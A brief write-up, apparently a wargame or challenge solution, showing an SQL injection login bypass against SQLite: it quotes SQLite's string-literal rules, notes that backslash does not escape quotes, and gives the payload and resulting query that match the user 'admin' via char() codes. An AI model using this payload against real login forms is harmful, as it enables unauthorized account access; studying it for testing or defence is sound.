?id=\' or id=char(97,100,109,105,110)--

----
Relevant quote from the documentation:

A string constant is formed by enclosing the string in single quotes ('). A
single quote within the string can be encoded by putting two single quotes in
a row - as in Pascal. C-style escapes using the backslash character are not
supported because they are not standard SQL. BLOB literals are string literals
containing hexadecimal data and preceded by a single "x" or "X" character. ...
A literal value can also be the token "NULL".
----

So, SQLite will not escape single quote. However, admin will be searched by
instead of admin, so we add a condition.

query : select id from member where id=\' or id=char(97,100,109,105,110)--' and pw=''
